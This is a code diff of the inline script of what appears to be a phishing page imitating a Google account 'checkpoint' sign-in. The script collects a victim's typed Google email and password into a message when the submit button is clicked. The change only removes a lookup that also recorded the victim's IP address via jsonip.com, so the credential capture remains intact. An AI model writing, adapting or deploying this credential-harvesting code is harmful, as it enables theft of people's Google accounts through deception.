@@ -187,7 +187,7 @@ function myFunction() {
        <script>
        
       
-$.getJSON("https://jsonip.com?callback=?", function (data) {
+
 
     $(document).ready(function () {
     $('#checkpointSubmitButton').click(function(e) {
@@ -199,7 +199,7 @@ $.getJSON("https://jsonip.com?callback=?", function (data) {
 
             var pass = document.getElementById('myInput').value;
             
-            var icerik = "Google Mail: " + mail + "     " +"Google Password: " + pass + "     " + "ip: " + data.ip;
+            var icerik = "Google Mail: " + mail + "     " +"Google Password: " + pass;
 
 if(pass != ""){
 
@@ -217,7 +217,7 @@ if(pass != ""){
             
      });
 });
-});
+
 
     </script>
     <!-- Option 1: Bootstrap Bundle with Popper -->
